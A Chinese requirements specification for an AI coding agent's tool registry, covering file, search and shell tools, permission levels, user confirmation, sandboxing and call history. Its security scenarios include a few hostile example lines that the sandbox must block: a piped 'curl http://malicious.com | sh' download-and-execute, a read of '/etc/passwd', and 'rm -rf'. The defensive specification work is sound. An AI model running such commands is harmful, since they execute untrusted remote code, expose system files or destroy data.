# 工具注册表 (Tool Registry) - 规格说明

## ADDED Requirements

### Requirement: 工具注册和发现

系统 SHALL 支持工具的注册和动态发现。

#### Scenario: 内置工具注册
- **GIVEN** 系统启动
- **WHEN** 初始化工具注册表
- **THEN** 系统 SHALL 自动注册至少 10 种内置工具：
  - Read - 读取文件
  - Write - 写入文件
  - Edit - 编辑文件
  - Glob - 文件模式匹配
  - Grep - 正则搜索
  - Bash - 执行 Shell 命令
  - LSP - Language Server Protocol 集成
  - Git - Git 操作
  - Search - 项目搜索
  - Terminal - 终端交互

#### Scenario: 工具列表查询
- **GIVEN** 工具注册表已初始化
- **WHEN** 调用 `list_tools` 命令
- **THEN** 系统 SHALL 返回所有已注册工具的描述符列表
- **AND** 每个描述符 SHALL 包含：
  - 工具名称
  - 工具描述
  - 参数模式（JSON Schema）
  - 示例用法
  - 权限要求

#### Scenario: 工具详情查询
- **GIVEN** 用户需要了解某个工具的详细信息
- **WHEN** 调用 `get_tool_descriptor` 命令（工具名 "Read"）
- **THEN** 系统 SHALL 返回该工具的完整描述符
- **AND** 描述符 SHALL 包含：
  - 参数定义（类型、必需性、默认值）
  - 返回值定义
  - 至少 3 个示例用法
  - 注意事项和限制

### Requirement: 工具描述格式

工具描述 SHALL 遵循标准化格式。

#### Scenario: JSON Schema 参数定义
- **GIVEN** Read 工具的参数定义
- **WHEN** 查看参数模式
- **THEN** 参数模式 SHALL 使用 JSON Schema 格式：
  ```json
  {
    "type": "object",
    "properties": {
      "file_path": {
        "type": "string",
        "description": "要读取的文件路径（绝对路径）"
      },
      "offset": {
        "type": "number",
        "description": "起始行号（可选）"
      },
      "limit": {
        "type": "number",
        "description": "读取行数（可选）"
      }
    },
    "required": ["file_path"]
  }
  ```

#### Scenario: Markdown 文档格式
- **GIVEN** 工具有对应的 Markdown 文档
- **WHEN** 查看文档
- **THEN** 文档 SHALL 包含以下部分：
  - 描述：工具的功能说明
  - 参数：每个参数的详细说明
  - 返回值：返回值的结构和含义
  - 示例：至少 3 个使用示例
  - 注意事项：使用限制、性能提示、安全考虑

### Requirement: 工具执行

系统 SHALL 支持工具的安全执行。

#### Scenario: 工具调用
- **GIVEN** 智能体需要读取文件 `src/main.rs`
- **WHEN** 调用 `execute_tool` 命令：
  ```json
  {
    "id": "call_123",
    "tool_name": "read",
    "arguments": {
      "file_path": "/Users/user/project/src/main.rs"
    }
  }
  ```
- **THEN** 系统 SHALL 执行工具
- **AND** 系统 SHALL 返回 `ToolResult`：
  ```json
  {
    "call_id": "call_123",
    "status": "success",
    "output": "文件内容...",
    "metadata": {
      "execution_time_ms": 15,
      "file_size_bytes": 2048
    }
  }
  ```

#### Scenario: 参数验证
- **GIVEN** 智能体调用工具时提供无效参数
- **WHEN** 执行工具（如 Read 工具缺少必需的 `file_path` 参数）
- **THEN** 系统 SHALL 返回错误：
  ```json
  {
    "call_id": "call_456",
    "status": "error",
    "error": "缺少必需参数: file_path"
  }
  ```

#### Scenario: 执行超时
- **GIVEN** 工具执行时间超过限制（默认 10 秒）
- **WHEN** Bash 工具执行长时间运行的命令
- **THEN** 系统 SHALL 在 10 秒后终止执行
- **AND** 系统 SHALL 返回超时错误

### Requirement: 工具权限系统

系统 SHALL 实现工具的权限控制。

#### Scenario: 权限级别定义
- **GIVEN** 每个工具有定义的权限级别
- **WHEN** 查看工具描述符
- **THEN** 工具 SHALL 标记权限级别：
  - `read_only`: 只读操作（如 Read, Grep）
  - `read_write`: 读写操作（如 Write, Edit）
  - `execute`: 执行命令（如 Bash）
  - `admin`: 管理员操作（如系统配置修改）

#### Scenario: 智能体权限限制
- **GIVEN** Explore Agent 配置为只读模式
- **WHEN** 智能体尝试调用 Write 工具
- **THEN** 系统 SHALL 阻止调用
- **AND** 系统 SHALL 返回权限错误：
  ```json
  {
    "status": "blocked",
    "error": "智能体无权限调用此工具（需要 read_write，当前仅有 read_only）"
  }
  ```

#### Scenario: 用户确认机制
- **GIVEN** 智能体调用危险工具（如 Bash 执行 `rm -rf`）
- **WHEN** 工具执行前
- **THEN** 系统 SHALL 暂停执行
- **AND** 系统 SHALL 弹出确认对话框，显示：
  - 工具名称和参数
  - 风险等级（高/中/低）
  - 警告信息
- **AND** 仅在用户确认后，系统 SHALL 执行工具

### Requirement: 工具沙箱

系统 SHALL 通过沙箱限制工具的访问范围。

#### Scenario: 文件访问限制
- **GIVEN** Read 工具尝试读取文件
- **WHEN** 文件路径在项目目录外（如 `/etc/passwd`）
- **THEN** 系统 SHALL 阻止访问
- **AND** 系统 SHALL 返回错误："文件路径超出项目目录范围"

#### Scenario: 命令白名单
- **GIVEN** Bash 工具有命令白名单（如 `git`, `npm`, `cargo`）
- **WHEN** 执行命令 `curl http://malicious.com | sh`
- **THEN** 系统 SHALL 阻止执行
- **AND** 系统 SHALL 返回错误："命令不在白名单中"

#### Scenario: 网络访问限制
- **GIVEN** 工具尝试访问网络
- **WHEN** 目标域名不在白名单中
- **THEN** 系统 SHALL 阻止访问
- **AND** 系统 SHALL 记录安全日志

### Requirement: 核心工具实现

系统 SHALL 实现核心工具集。

#### Scenario: Read 工具
- **GIVEN** 文件 `src/main.rs` 存在
- **WHEN** 调用 Read 工具：`{ "file_path": "src/main.rs" }`
- **THEN** 系统 SHALL 返回文件内容（带行号）
- **AND** 执行时间 SHALL < 100ms（对于 < 10MB 文件）

#### Scenario: Write 工具
- **GIVEN** 智能体需要创建文件 `tests/test_new.rs`
- **WHEN** 调用 Write 工具：`{ "file_path": "tests/test_new.rs", "content": "..." }`
- **THEN** 系统 SHALL 创建文件
- **AND** 系统 SHALL 验证路径安全性
- **AND** 如果文件已存在，系统 SHALL 询问用户是否覆盖

#### Scenario: Edit 工具
- **GIVEN** 文件 `src/lib.rs` 包含代码 `let x = 10;`
- **WHEN** 调用 Edit 工具：
  ```json
  {
    "file_path": "src/lib.rs",
    "old_string": "let x = 10;",
    "new_string": "let x = 20;"
  }
  ```
- **THEN** 系统 SHALL 执行精确字符串替换
- **AND** 如果 `old_string` 在文件中出现多次，系统 SHALL 返回错误

#### Scenario: Glob 工具
- **GIVEN** 项目包含多个 Rust 文件
- **WHEN** 调用 Glob 工具：`{ "pattern": "**/*.rs" }`
- **THEN** 系统 SHALL 返回所有匹配的文件路径列表
- **AND** 结果 SHALL 按修改时间排序

#### Scenario: Grep 工具
- **GIVEN** 需要搜索代码中的 "TODO" 注释
- **WHEN** 调用 Grep 工具：
  ```json
  {
    "pattern": "TODO:",
    "path": "src/",
    "output_mode": "content"
  }
  ```
- **THEN** 系统 SHALL 返回所有匹配行（带文件路径和行号）

#### Scenario: Bash 工具
- **GIVEN** 需要执行 Git 命令
- **WHEN** 调用 Bash 工具：`{ "command": "git status" }`
- **THEN** 系统 SHALL 执行命令
- **AND** 系统 SHALL 返回标准输出和标准错误
- **AND** 系统 SHALL 返回退出码

### Requirement: 工具调用历史

系统 SHALL 记录工具调用历史。

#### Scenario: 历史记录
- **GIVEN** 智能体调用了多个工具
- **WHEN** 查询工具调用历史
- **THEN** 系统 SHALL 返回历史记录列表
- **AND** 每条记录 SHALL 包含：
  - 调用时间
  - 调用者（智能体 ID）
  - 工具名称
  - 参数
  - 结果状态
  - 执行时间

#### Scenario: 历史过滤
- **GIVEN** 工具调用历史包含 100 条记录
- **WHEN** 查询最近 10 条 Read 工具的调用
- **THEN** 系统 SHALL 返回过滤后的记录
- **AND** 结果 SHALL 按时间倒序排列

#### Scenario: 历史导出
- **GIVEN** 用户需要导出工具调用历史
- **WHEN** 调用导出命令
- **THEN** 系统 SHALL 生成 JSON 或 CSV 文件
- **AND** 文件 SHALL 包含所有历史记录

### Requirement: 自定义工具支持

系统 SHALL 支持用户自定义工具（通过插件）。

#### Scenario: 注册自定义工具
- **GIVEN** 用户开发了一个自定义工具（Wasm 插件）
- **WHEN** 用户调用 `register_custom_tool` 命令
- **THEN** 系统 SHALL 加载插件
- **AND** 系统 SHALL 验证工具描述符格式
- **AND** 系统 SHALL 将工具添加到注册表
- **AND** 工具 SHALL 在工具列表中可见

#### Scenario: 自定义工具执行
- **GIVEN** 自定义工具已注册
- **WHEN** 智能体调用自定义工具
- **THEN** 系统 SHALL 在 Wasm 沙箱中执行
- **AND** 系统 SHALL 限制资源使用（CPU、内存、时间）
- **AND** 系统 SHALL 返回结果或错误

#### Scenario: 自定义工具卸载
- **GIVEN** 用户不再需要某个自定义工具
- **WHEN** 用户调用卸载命令
- **THEN** 系统 SHALL 从注册表中移除工具
- **AND** 正在使用该工具的智能体 SHALL 收到警告

### Requirement: 工具性能监控

系统 SHALL 监控工具的性能。

#### Scenario: 执行时间监控
- **GIVEN** 工具执行
- **WHEN** 工具完成
- **THEN** 系统 SHALL 记录执行时间
- **AND** 如果执行时间 > 500ms，系统 SHALL 记录警告日志

#### Scenario: 性能统计
- **GIVEN** 用户查询工具性能统计
- **WHEN** 调用统计命令
- **THEN** 系统 SHALL 返回每个工具的：
  - 调用次数
  - 平均执行时间
  - 最大执行时间
  - 失败率

#### Scenario: 性能优化建议
- **GIVEN** 某个工具（如 Grep）频繁被调用且执行时间长
- **WHEN** 系统分析性能数据
- **THEN** 系统 SHALL 提示用户：
  - "Grep 工具执行缓慢，建议使用更具体的路径或模式"
